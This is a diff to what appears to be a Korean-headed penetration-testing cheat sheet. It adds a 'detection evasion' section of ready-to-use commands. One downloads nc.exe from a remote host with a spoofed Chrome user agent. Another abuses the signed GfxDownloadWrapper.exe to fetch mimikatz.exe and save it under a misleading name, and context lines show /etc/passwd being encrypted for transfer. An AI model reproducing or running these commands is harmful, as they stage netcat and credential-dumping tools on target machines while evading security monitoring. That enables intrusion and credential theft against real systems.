@@ -194,3 +194,15 @@ Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
 ### Linux File Encryption/Decryption
 ```openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc```<br/>
 ```openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd```
+
+<br/><br/>
+## 탐지 우회
+
+### Chrome User Agent로 다운로드
+```
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://192.168.1.1/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+### Transferring File - GfxDownloadWrapper
+```GfxDownloadWrapper.exe "http://192.168.1.1/mimikatz.exe" "C:\Temp\nc.exe"```
